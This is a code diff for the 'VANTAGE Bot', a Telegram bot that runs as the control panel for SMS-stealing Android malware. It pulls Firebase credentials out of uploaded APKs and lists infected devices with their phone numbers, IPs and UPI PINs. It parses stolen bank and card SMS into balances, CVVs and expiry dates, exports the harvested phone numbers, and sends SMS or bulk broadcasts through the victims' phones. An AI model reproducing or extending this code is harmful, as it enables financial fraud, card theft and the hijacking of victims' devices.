-async def admin_device_detail(update: Update, context: ContextTypes.DEFAULT_TYPE, dev_id: str):
-    query = update.callback_query
-    uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
+async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
         return
-    try:
-        raw = await fb_get(current['url'], current['key'], "clients")
-        devices = parse_devices(raw)
-        dev = next((d for d in devices if d['id'] == dev_id), None)
-        if not dev:
-            await query.edit_message_text("❌ Device not found.")
-            return
-        
-        raw_msgs = await fb_get(current['url'], current['key'], f"messages/{dev_id}", {"limitToLast": "100"})
-        msgs = parse_messages(raw_msgs)
-        
-        text = f"📱 *{dev['name']}*\n\n"
-        text += f"🆔 `{dev['id']}`\n"
-        text += f"📊 {'🟢 Online' if dev['status'] else '⚫ Offline'}\n"
-        text += f"🔋 {dev['battery']}\n"
-        text += f"📞 `{mask_number(dev['phoneNumber'])}`\n"
-        text += f"🤖 {dev['android']} | 🌐 {dev['provider']}\n"
-        text += f"🌍 `{dev['ip']}`\n"
-        if dev['upipin']:
-            text += f"💳 UPI: `{dev['upipin']}`\n"
-        
-        if msgs:
-            text += f"\n📨 Last messages:\n"
-            for m in msgs[:5]:
-                text += f"👤 `{m['sender']}` • {m['time']}\n{m['text'][:100]}\n─\n"
-        
-        kb = [
-            [InlineKeyboardButton("📤 Send SMS", callback_data=f"asend_{dev_id}")],
-            [InlineKeyboardButton("🗑 Delete", callback_data=f"adeldev_{dev_id}")],
-            [InlineKeyboardButton("🔙 Back", callback_data="admin_devices")],
-        ]
-        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-    except Exception as e:
-        await query.edit_message_text(f"❌ Error: {e}")
-
-
-async def admin_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
-        await query.edit_message_text("❌ No active account.")
-        return MAIN_MENU
-    try:
-        devices = await fetch_all_devices_data(current)
-        banks = []
-        for d in devices:
-            for m in d.get('messages', []):
-                b = parse_bank_sms(m['text'], m['sender'])
-                if b:
-                    b['device'] = d['name']
-                    banks.append(b)
-        if not banks:
-            await query.edit_message_text("📭 No bank SMS.")
-            return MAIN_MENU
-        text = f"🏦 *Bank Messages* ({len(banks)})\n\n"
-        for b in banks[:20]:
-            text += f"🏦 *{b['bankName']}*\n"
-            text += f"💰 ₹{b['availableBalance']:,.2f}\n"
-            if b.get('transactionType') and b.get('transactionAmount'):
-                s = "+" if b['transactionType'] == 'credit' else "-"
-                text += f"📊 {s}₹{b['transactionAmount']:,.2f}\n"
-            if b.get('accountLast4'):
-                text += f"🔢 ****{b['accountLast4']}\n"
-            text += f"📱 {b['device'][:20]}\n─\n"
-        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]), parse_mode='Markdown')
-    except Exception as e:
-        await query.edit_message_text(f"❌ Error: {e}")
-    return MAIN_MENU
-
-
-async def admin_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
-        await query.edit_message_text("❌ No active account.")
-        return MAIN_MENU
-    try:
-        devices = await fetch_all_devices_data(current)
-        cards = []
-        for d in devices:
-            for m in d.get('messages', []):
-                c = parse_card_sms(m['text'])
-                if c:
-                    c['device'] = d['name']
-                    cards.append(c)
-        if not cards:
-            await query.edit_message_text("📭 No card info.")
-            return MAIN_MENU
-        text = f"💳 *Cards* ({len(cards)})\n\n"
-        for c in cards[:20]:
-            text += f"💳 *{c['cardType']}*\n"
-            text += f"🔢 **** **** **** {c['cardLast4']}\n"
-            if c.get('cvv'):
-                text += f"🔐 CVV: `{c['cvv']}`\n"
-            if c.get('expiry'):
-                text += f"📅 {c['expiry']}\n"
-            text += "─\n"
-        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]), parse_mode='Markdown')
-    except Exception as e:
-        await query.edit_message_text(f"❌ Error: {e}")
-    return MAIN_MENU
+    reg = DB.get('user_registry', {})
+    locked = DB.get('locked_users', {})
+    text = f"👥 **All Users** ({len(reg)})\n\n"
+    for uid, info in list(reg.items())[:50]:
+        name = info.get('username') or info.get('name') or '—'
+        lock_icon = "🔒" if uid in locked else "🟢"
+        text += f"{lock_icon} `{uid}` @{name}\n"
+    await update.message.reply_text(text[:4000], parse_mode='Markdown')
 
 
 # ============================================
-# ADMIN BUTTON HANDLER
+# BUTTON HANDLERS
 # ============================================
-async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    data = query.data
     uid = update.effective_user.id
+    data = query.data
     
-    if not is_admin(uid):
-        await query.edit_message_text("⛔ Admin only.")
+    if is_locked(uid):
+        await query.answer("🔒 Locked", show_alert=True)
         return MAIN_MENU
     
     if data == "main_menu":
         await show_menu(update, context)
+        return MAIN_MENU
     
-    elif data == "refresh":
+    if data == "refresh":
         await show_menu(update, context)
+        return MAIN_MENU
     
-    elif data == "add_account":
+    # Non-admin can only refresh
+    if not is_admin(uid):
+        return MAIN_MENU
+    
+    # Admin handlers
+    if data == "add_account":
         context.user_data.clear()
         await query.edit_message_text(
-            "📝 *Add Firebase Account*\n\n"
+            "📝 **Add Firebase Account**\n\n"
             "Send Firebase URL or upload APK:\n\n"
+            "**Supported:**\n"
+            "• Single URL\n"
+            "• Multiple URLs (newline separated)\n"
+            "• APK file auto-extract\n\n"
             "Example: `https://your-app.firebaseio.com`",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
             parse_mode='Markdown'
         )
         return ADD_URL
     
-    elif data == "admin_devices":
-        await admin_devices(update, context)
+    if data == "admin_devices":
+        try:
+            devs = await fetch_all_online_devices(uid)
+            if not devs:
+                await query.edit_message_text("📭 **No online devices**", parse_mode='Markdown')
+                return MAIN_MENU
+            text = f"📱 **Online Devices** ({len(devs)})\n\n"
+            for d in devs[:20]:
+                num = d['phoneNumber'] if d['phoneNumber'] != '—' else '—'
+                text += f"🟢 **{d['name'][:25]}**\n"
+                text += f"   📞 `{num}` | 🔋 {d['battery']}\n"
+                text += f"   🌐 {d['provider'][:20]}\n\n"
+            await query.edit_message_text(
+                text[:4000],
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]),
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await query.edit_message_text(f"❌ {e}")
+        return MAIN_MENU
     
-    elif data == "admin_numbers":
-        await admin_numbers(update, context)
+    if data == "admin_numbers":
+        try:
+            nums = await fetch_all_numbers(uid)
+            if not nums:
+                await query.edit_message_text("📭 **No numbers**", parse_mode='Markdown')
+                return MAIN_MENU
+            text = f"📞 **All Numbers** ({len(nums)})\n\n"
+            for i, n in enumerate(nums[:80], 1):
+                text += f"`{i}.` **{n['number']}** — _{n['device'][:15]}_\n"
+            if len(nums) > 80:
+                text += f"\n_...and {len(nums) - 80} more_"
+            await query.edit_message_text(
+                text[:4000],
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("📤 Export as file", callback_data="admin_export")],
+                    [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
+                ]),
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await query.edit_message_text(f"❌ {e}")
+        return MAIN_MENU
     
-    elif data.startswith("adev_"):
-        await admin_device_detail(update, context, data.split("_", 1)[1])
+    if data == "admin_export":
+        try:
+            nums = await fetch_all_numbers(uid)
+            if not nums:
+                await query.edit_message_text("📭 No numbers to export")
+                return MAIN_MENU
+            content = f"# VANTAGE Numbers Export\n# Generated: {datetime.now().isoformat()}\n# Total: {len(nums)}\n\n"
+            for n in nums:
+                content += f"{n['number']} | {n['device']} | {n['provider']} | {n['battery']}\n"
+            
+            f = io.BytesIO(content.encode())
+            f.name = f"numbers_{int(time.time())}.txt"
+            await query.message.reply_document(
+                document=f,
+                filename=f.name,
+                caption=f"📤 **{len(nums)}** numbers exported"
+            )
+        except Exception as e:
+            await query.edit_message_text(f"❌ {e}")
+        return MAIN_MENU
     
-    elif data == "admin_bank":
-        await admin_bank(update, context)
+    if data == "admin_bank":
+        try:
+            devs = await fetch_all_online_devices(uid)
+            banks = []
+            for d in devs:
+                for m in d.get('messages', []):
+                    b = parse_bank_sms(m['text'], m['sender'])
+                    if b:
+                        b['device'] = d['name']
+                        banks.append(b)
+            if not banks:
+                await query.edit_message_text("📭 **No bank SMS**", parse_mode='Markdown')
+                return MAIN_MENU
+            text = f"🏦 **Bank Messages** ({len(banks)})\n\n"
+            for b in banks[:15]:
+                text += f"🏦 **{b['bankName']}**\n"
+                text += f"💰 ₹{b['availableBalance']:,.2f}\n"
+                if b.get('transactionType') and b.get('transactionAmount'):
+                    s = "＋" if b['transactionType'] == 'credit' else "－"
+                    text += f"{s}₹{b['transactionAmount']:,.2f}\n"
+                text += f"📱 {b['device'][:20]}\n─\n"
+            await query.edit_message_text(
+                text[:4000],
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await query.edit_message_text(f"❌ {e}")
+        return MAIN_MENU
     
-    elif data == "admin_cards":
-        await admin_cards(update, context)
+    if data == "admin_cards":
+        try:
+            devs = await fetch_all_online_devices(uid)
+            cards = []
+            for d in devs:
+                for m in d.get('messages', []):
+                    c = parse_card_sms(m['text'])
+                    if c:
+                        c['device'] = d['name']
+                        cards.append(c)
+            if not cards:
+                await query.edit_message_text("📭 **No card info**", parse_mode='Markdown')
+                return MAIN_MENU
+            text = f"💳 **Cards** ({len(cards)})\n\n"
+            for c in cards[:15]:
+                text += f"💳 **{c['cardType']}**\n"
+                text += f"🔢 **** **** **** {c['cardLast4']}\n"
+                if c.get('cvv'):
+                    text += f"🔐 CVV: `{c['cvv']}`\n"
+                if c.get('expiry'):
+                    text += f"📅 {c['expiry']}\n"
+                text += "─\n"
+            await query.edit_message_text(
+                text[:4000],
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="main_menu")]]),
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await query.edit_message_text(f"❌ {e}")
+        return MAIN_MENU
     
-    elif data == "admin_accounts":
+    if data == "admin_accounts":
         accs = get_accounts(uid)
         cur = get_current(uid)
-        text = "📁 *Your Accounts*\n\n"
+        text = "📁 **Your Accounts**\n\n"
         kb = []
         for i, a in enumerate(accs):
             marker = "✅ " if cur and cur['id'] == a['id'] else "▫️ "
             kb.append([InlineKeyboardButton(
-                f"{marker}{a['url'][:40]}",
+                f"{marker}{a['url'][:35]}",
                 callback_data=f"aswitch_{a['id']}"
             )])
             kb.append([InlineKeyboardButton(f"🗑 Del #{i+1}", callback_data=f"adelacc_{a['id']}")])
         kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+        return MAIN_MENU
     
-    elif data.startswith("aswitch_"):
+    if data.startswith("aswitch_"):
         acc_id = int(data.split("_", 1)[1])
         set_current(uid, acc_id)
         await show_menu(update, context)
+        return MAIN_MENU
     
-    elif data.startswith("adelacc_"):
+    if data.startswith("adelacc_"):
         acc_id = int(data.split("_", 1)[1])
         accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
         save_accounts(uid, accs)
@@ -1155,109 +1239,125 @@ async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         if cur and cur['id'] == acc_id:
             set_current(uid, accs[0]['id'] if accs else None)
         await show_menu(update, context)
+        return MAIN_MENU
     
-    elif data == "admin_send":
-        current = get_current(uid)
-        if not current:
-            return
-        devices = await fetch_all_devices_data(current)
-        online = [d for d in devices if d['status']]
-        if not online:
-            await query.edit_message_text("❌ No online devices.")
+    if data == "admin_send":
+        devs = await fetch_all_online_devices(uid)
+        if not devs:
+            await query.edit_message_text("❌ No online devices")
             return MAIN_MENU
         kb = []
-        for d in online[:20]:
-            kb.append([InlineKeyboardButton(f"📱 {d['name'][:30]}", callback_data=f"asend_{d['id']}")])
-        kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
-        await query.edit_message_text("📤 *Select device:*", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+        for d in devs[:20]:
+            kb.append([InlineKeyboardButton(
+                f"📱 {d['name'][:30]} ({d['battery']})",
+                callback_data=f"asend_{d['_acc_id']}_{d['id']}"
+            )])
+        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
+        await query.edit_message_text("📤 **Select device:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+        return MAIN_MENU
     
-    elif data.startswith("asend_"):
-        context.user_data['send_dev'] = data.split("_", 1)[1]
-        await query.edit_message_text(
-            "📤 *Send SMS*\n\nEnter recipient number:",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
-            parse_mode='Markdown'
-        )
-        return SEND_NUM
+    if data.startswith("asend_"):
+        parts = data.split("_", 2)
+        if len(parts) == 3:
+            acc_id, dev_id = int(parts[1]), parts[2]
+            context.user_data['send_acc_id'] = acc_id
+            context.user_data['send_dev'] = dev_id
+            await query.edit_message_text(
+                "📤 **Send SMS**\n\nEnter recipient number:",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
+                parse_mode='Markdown'
+            )
+            return SEND_NUM
     
-    elif data.startswith("adeldev_"):
-        dev_id = data.split("_", 1)[1]
-        current = get_current(uid)
-        if current:
-            await fb_delete(current['url'], current['key'], f"clients/{dev_id}")
-            await query.edit_message_text(f"🗑 Deleted `{dev_id}`", parse_mode='Markdown')
-            await show_menu(update, context)
-    
-    elif data == "admin_broadcast":
-        current = get_current(uid)
-        if not current:
-            return
-        devices = await fetch_all_devices_data(current)
-        online = [d for d in devices if d['status']]
-        if not online:
-            await query.edit_message_text("❌ No online devices.")
+    if data == "admin_broadcast":
+        devs = await fetch_all_online_devices(uid)
+        if not devs:
+            await query.edit_message_text("❌ No online devices")
             return MAIN_MENU
-        context.user_data['bc_devs'] = [d['id'] for d in online]
+        context.user_data['bc_devs'] = [(d['_acc_id'], d['id']) for d in devs]
         await query.edit_message_text(
-            f"📢 *Broadcast to {len(online)} devices*\n\nEnter recipient number:",
+            f"📢 **Broadcast to {len(devs)} devices**\n\nEnter recipient number:",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]),
             parse_mode='Markdown'
         )
         return BC_TO
     
-    elif data == "toggle_lock":
+    if data == "toggle_lock":
         DB['bot_locked'] = not DB.get('bot_locked', False)
         save_data(DB)
         await show_menu(update, context)
+        return MAIN_MENU
     
-    elif data == "admin_users":
+    if data == "admin_users":
+        reg = DB.get('user_registry', {})
         locked = DB.get('locked_users', {})
-        text = f"👥 *User Management*\n\n🔒 Locked: {len(locked)}\n\n"
+        text = f"👥 **User Management**\n\n📊 Total: {len(reg)}\n🔒 Locked: {len(locked)}\n\n"
         kb = []
-        if locked:
-            for luid, info in locked.items():
-                text += f"• `{luid}` — {info.get('reason', 'N/A')[:30]}\n"
-                kb.append([InlineKeyboardButton(f"🔓 Unlock {luid}", callback_data=f"aunlock_{luid}")])
-        else:
-            text += "_No locked users_"
+        for luid, info in locked.items():
+            text += f"🔒 `{luid}` — {info.get('reason', 'N/A')[:25]}\n"
+            kb.append([InlineKeyboardButton(f"🔓 Unlock {luid}", callback_data=f"aunlock_{luid}")])
+        kb.append([InlineKeyboardButton("📋 View All Users", callback_data="admin_allusers")])
         kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
-        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+        return MAIN_MENU
     
-    elif data.startswith("aunlock_"):
+    if data == "admin_allusers":
+        reg = DB.get('user_registry', {})
+        locked = DB.get('locked_users', {})
+        text = f"👥 **All Users** ({len(reg)})\n\n"
+        for uid_s, info in list(reg.items())[:40]:
+            name = info.get('username') or info.get('name') or '—'
+            lock = "🔒" if uid_s in locked else "🟢"
+            text += f"{lock} `{uid_s}` @{name}\n"
+        await query.edit_message_text(
+            text[:4000],
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_users")]]),
+            parse_mode='Markdown'
+        )
+        return MAIN_MENU
+    
+    if data.startswith("aunlock_"):
         luid = data.split("_", 1)[1]
         DB.get('locked_users', {}).pop(luid, None)
         save_data(DB)
         await show_menu(update, context)
-    
-    elif data == "admin_stats":
-        await cmd_stats(update, context)
-    
-    return MAIN_MENU
-
-
-# ============================================
-# USER BUTTON HANDLER
-# ============================================
-async def user_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if query.data in ("refresh", "main_menu"):
-        await show_menu(update, context)
-    return MAIN_MENU
-
-
-# ============================================
-# MASTER BUTTON HANDLER
-# ============================================
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    uid = update.effective_user.id
-    if is_locked(uid):
-        await query.answer("🔒 Locked", show_alert=True)
         return MAIN_MENU
-    if is_admin(uid):
-        return await admin_button_handler(update, context)
-    return await user_button_handler(update, context)
+    
+    if data == "admin_stats":
+        await cmd_stats(update, context)
+        return MAIN_MENU
+    
+    if data == "admin_remove_fb":
+        accs = get_accounts(uid)
+        if not accs:
+            await query.edit_message_text("📭 No accounts")
+            return MAIN_MENU
+        kb = []
+        for a in accs:
+            kb.append([InlineKeyboardButton(
+                f"🗑 {a['url'][:35]}",
+                callback_data=f"armfb_{a['id']}"
+            )])
+        kb.append([InlineKeyboardButton("🔙", callback_data="main_menu")])
+        await query.edit_message_text(
+            "🗑 **Remove Firebase Account**\n\nSelect to remove:",
+            reply_markup=InlineKeyboardMarkup(kb),
+            parse_mode='Markdown'
+        )
+        return MAIN_MENU
+    
+    if data.startswith("armfb_"):
+        acc_id = int(data.split("_", 1)[1])
+        accs = [a for a in get_accounts(uid) if a['id'] != acc_id]
+        save_accounts(uid, accs)
+        cur = get_current(uid)
+        if cur and cur['id'] == acc_id:
+            set_current(uid, accs[0]['id'] if accs else None)
+        await query.edit_message_text("✅ Firebase account removed")
+        await show_menu(update, context)
+        return MAIN_MENU
+    
+    return MAIN_MENU
 
 
 # ============================================
@@ -1280,15 +1380,15 @@ async def handle_add_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
             fb = await file.download_as_bytearray()
             res = await parse_apk(bytes(fb))
             if not res or (not res.get('firebaseUrl') and not res.get('apiKey')):
-                await status.edit_text("❌ No Firebase config.")
+                await status.edit_text("❌ No Firebase config found")
                 return ADD_URL
             context.user_data['pending_urls'] = [res.get('firebaseUrl', '')]
             context.user_data['pending_key'] = res.get('apiKey', '')
             await status.edit_text(
-                f"✅ *APK Parsed!*\n\n"
+                f"✅ **APK Parsed!**\n\n"
                 f"🔗 `{res.get('firebaseUrl', 'N/A')}`\n"
-                f"🔑 `{res.get('apiKey', 'N/A')[:40]}...`\n\n"
-                f"Send auth key or `skip` to use extracted key:",
+                f"🔑 `{res.get('apiKey', 'N/A')[:30]}...`\n\n"
+                f"Send auth key or `skip`:",
                 parse_mode='Markdown'
             )
             return ADD_KEY
@@ -1304,12 +1404,18 @@ async def handle_add_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not urls:
         urls = ['https://' + u for u in re.findall(r'[a-zA-Z0-9_-]+\.(?:firebaseio\.com|firebasedatabase\.app)', text)]
     if not urls:
-        await msg.reply_text("❌ No valid URL. Try again or /cancel")
+        await msg.reply_text("❌ No valid URL found. Try again or /cancel")
         return ADD_URL
+    
+    # Dedupe
+    urls = list(dict.fromkeys(urls))
     
     context.user_data['pending_urls'] = urls
     await msg.reply_text(
-        f"📦 {len(urls)} URL(s) found\n\nSend auth key or `skip`:"
+        f"📦 **{len(urls)} URL(s) detected**\n\n"
+        + "\n".join([f"`{u[:50]}`" for u in urls[:10]])
+        + f"\n\nSend auth key or `skip`:",
+        parse_mode='Markdown'
     )
     return ADD_KEY
 
@@ -1328,11 +1434,10 @@ async def handle_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_menu(update, context)
         return MAIN_MENU
     
-    status = await update.message.reply_text(f"🔌 Testing {len(urls)}...")
+    status = await update.message.reply_text(f"🔌 Testing {len(urls)} connection(s)...")
     
     accs = get_accounts(uid)
-    added = 0
-    failed = 0
+    added, failed = 0, 0
     
     for url in urls:
         try:
@@ -1353,11 +1458,15 @@ async def handle_add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
             failed += 1
     
     save_accounts(uid, accs)
-    if added > 0:
+    if added > 0 and not get_current(uid):
         set_current(uid, accs[-1]['id'])
     
     await status.edit_text(
-        f"✅ Added: {added}\n❌ Failed: {failed}\n📁 Total: {len(accs)}"
+        f"✅ **Results**\n\n"
+        f"✅ Added: **{added}**\n"
+        f"❌ Failed: **{failed}**\n"
+        f"📁 Total: **{len(accs)}**",
+        parse_mode='Markdown'
     )
     await show_menu(update, context)
     return MAIN_MENU
@@ -1380,13 +1489,14 @@ async def handle_send_num(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if not is_admin(uid):
-        return MAIN_MENU
     text = update.message.text.strip()
-    current = get_current(uid)
+    
+    acc_id = context.user_data.get('send_acc_id')
     dev_id = context.user_data.get('send_dev')
     num = context.user_data.get('send_num')
-    if not current or not dev_id or not num:
+    
+    acc = next((a for a in get_accounts(uid) if a['id'] == acc_id), None)
+    if not acc or not dev_id or not num:
         await update.message.reply_text("❌ Session expired.")
         return MAIN_MENU
     
@@ -1399,7 +1509,7 @@ async def handle_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
     payload = {'from': 1, 'to': num, 'message': text, 'isSended': False}
     ok = False
     for p in paths:
-        if await fb_put(current['url'], current['key'], p, payload):
+        if await fb_put(acc['url'], acc['key'], p, payload):
             ok = True
             break
     await status.edit_text("✅ SMS queued!" if ok else "❌ Failed")
@@ -1415,7 +1525,7 @@ async def handle_bc_to(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif len(digits) == 12 and digits.startswith('91'):
         num = '+' + digits
     else:
-        await update.message.reply_text("❌ Invalid number.")
+        await update.message.reply_text("❌ Invalid number")
         return BC_TO
     context.user_data['bc_num'] = num
     await update.message.reply_text("📢 Enter broadcast message:")
@@ -1434,39 +1544,40 @@ async def handle_bc_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if cnt < 1 or cnt > 10:
             raise ValueError
     except ValueError:
-        await update.message.reply_text("❌ Invalid. Send 1-10.")
+        await update.message.reply_text("❌ Send 1-10")
         return BC_COUNT
     
     uid = update.effective_user.id
-    current = get_current(uid)
-    if not current:
-        return MAIN_MENU
-    
     devs = context.user_data.get('bc_devs', [])
     num = context.user_data.get('bc_num')
     msg = context.user_data.get('bc_msg')
     
+    accs = {a['id']: a for a in get_accounts(uid)}
     total = len(devs) * cnt
-    status = await update.message.reply_text(f"📢 Broadcasting to {len(devs)} devices...\n0/{total}")
+    status = await update.message.reply_text(f"📢 Broadcasting... 0/{total}")
     
     done = 0
-    for dev_id in devs:
+    for acc_id, dev_id in devs:
+        acc = accs.get(acc_id)
+        if not acc:
+            continue
         for i in range(cnt):
             payload = {
                 'from': (i % 2) + 1,
                 'to': num, 'message': msg,
-                'isSended': False, '_bcTime': int(time.time() * 1000) + i,
+                'isSended': False,
+                '_bcTime': int(time.time() * 1000) + i,
             }
             for p in [f"clients/{dev_id}/webhookEvent/sendSms", f"clients/{dev_id}/commands"]:
                 try:
-                    if await fb_put(current['url'], current['key'], p, payload):
+                    if await fb_put(acc['url'], acc['key'], p, payload):
                         break
                 except Exception:
                     pass
             done += 1
             if done % 5 == 0:
                 try:
-                    await status.edit_text(f"📢 {done}/{total} ({done*100//total}%)")
+                    await status.edit_text(f"📢 Broadcasting... {done}/{total} ({done*100//total}%)")
                 except Exception:
                     pass
             await asyncio.sleep(0.5)
@@ -1474,7 +1585,7 @@ async def handle_bc_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
     DB['broadcasts_sent'] = DB.get('broadcasts_sent', 0) + 1
     save_data(DB)
     
-    await status.edit_text(f"✅ Broadcast complete! {done} SMS")
+    await status.edit_text(f"✅ **Broadcast complete!**\n\n{done} SMS queued", parse_mode='Markdown')
     await show_menu(update, context)
     return MAIN_MENU
 
@@ -1486,28 +1597,23 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ============================================
-# BACKGROUND TASK STARTUP
+# STARTUP
 # ============================================
 async def post_init(app: Application):
     await app.bot.set_my_commands([
         BotCommand("start", "Main menu"),
-        BotCommand("refresh", "Refresh data"),
+        BotCommand("refresh", "Refresh"),
         BotCommand("help", "Help"),
         BotCommand("cancel", "Cancel"),
     ])
     app.create_task(forward_loop(app))
-    logger.info("✅ Bot fully started")
+    logger.info("✅ VANTAGE Bot v2.0 fully started")
 
 
-# ============================================
-# MAIN
-# ============================================
 def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
         print("❌ Set BOT_TOKEN!")
         return
-    if not SMS_GROUP_ID or SMS_GROUP_ID == "-1001234567890":
-        print("⚠️  Set SMS_GROUP_ID environment variable!")
     
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
     
@@ -1540,10 +1646,11 @@ def main():
     app.add_handler(CommandHandler("lockuser", cmd_lock_user))
     app.add_handler(CommandHandler("unlockuser", cmd_unlock_user))
     app.add_handler(CommandHandler("stats", cmd_stats))
+    app.add_handler(CommandHandler("users", cmd_users))
     app.add_handler(CommandHandler("refresh", cmd_start))
     
-    print("🤖 VANTAGE Bot starting...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("🤖 VANTAGE Bot v2.0 starting...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
 if __name__ == "__main__":
